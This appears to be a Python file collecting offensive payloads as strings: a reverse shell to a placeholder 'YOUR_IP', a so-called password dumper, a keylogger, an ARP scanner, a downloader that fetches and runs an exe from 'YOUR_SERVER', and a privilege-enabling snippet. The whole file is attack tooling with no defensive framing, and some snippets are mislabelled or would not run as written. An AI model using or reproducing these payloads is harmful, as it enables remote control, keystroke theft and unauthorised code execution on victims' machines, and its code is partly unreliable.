import os
import random
import string

# Reverse shell payload
reverse_shell = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('YOUR_IP',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"

# Password dumper
password_dumper = "import win32api,win32con,win32security,ntsecuritycon;lsa=win32security.LsaOpenPolicy(None,win32security.POLICY_ALL_ACCESS);acct_rights=ntsecuritycon.SE_DEBUG_NAME;priv_set=win32security.LsaEnumerateAccountsWithUserRight(lsa,acct_rights);for sid,name,domain in priv_set:print(f'User: {name}, Domain: {domain}')"

# Keylogger
keylogger = "import pythoncom,pyHook;def OnKeyboardEvent(event):    print(chr(event.Ascii));    return True;hooks_manager=pyHook.HookManager();hooks_manager.KeyDown=OnKeyboardEvent;hooks_manager.HookKeyboard();pythoncom.PumpMessages()"

# Network scanner
network_scanner = "import scapy.all as scapy;request=scapy.ARP();request.pdst='192.168.1.1/24';broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff');arp_request_broadcast=broadcast/request;answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0];for item in answered_list:print(item[1].psrc)"

# File backdoor
file_backdoor = "import requests;url='http://YOUR_SERVER/file.exe';response=requests.get(url);open('C:\\Windows\\Temp\\file.exe','wb').write(response.content);os.startfile('C:\\Windows\\Temp\\file.exe')"

# Privilege escalation
privilege_escalation = "import win32api,win32con,win32security,ntsecuritycon;handle=win32security.OpenProcessToken(win32api.GetCurrentProcess(),win32con.TOKEN_ADJUST_PRIVILEGES|win32con.TOKEN_QUERY);privilege_id=win32security.LookupPrivilegeValue(None,ntsecuritycon.SE_DEBUG_NAME);privilege=[(privilege_id,win32security.SE_PRIVILEGE_ENABLED)];win32security.AdjustTokenPrivileges(handle,False,privilege)"